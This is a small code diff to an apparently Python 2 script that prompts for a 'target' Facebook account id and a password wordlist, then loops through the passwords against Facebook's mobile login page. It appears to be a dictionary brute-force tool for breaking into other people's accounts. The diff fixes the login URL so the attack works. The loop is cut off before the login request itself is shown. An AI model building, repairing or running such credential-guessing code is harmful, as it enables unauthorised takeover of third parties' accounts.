@@ -14,10 +14,10 @@ os.system('pkg install figlet')
 os.system('y')
 os.system('clear')
 os.system('figlet LITBE')
-url = "https://mbasi.facebook.com/login.php"
+url ='https://mbasic.facebook.com/login.php'
 
 akun = raw_input("enter your id target : ")
-list = raw_input(" enter your worldlist : ")
+list = raw_input("enter your worldlist : ")
 x = open(list,'r').readlines()
 for line in x:
   password = line.strip()
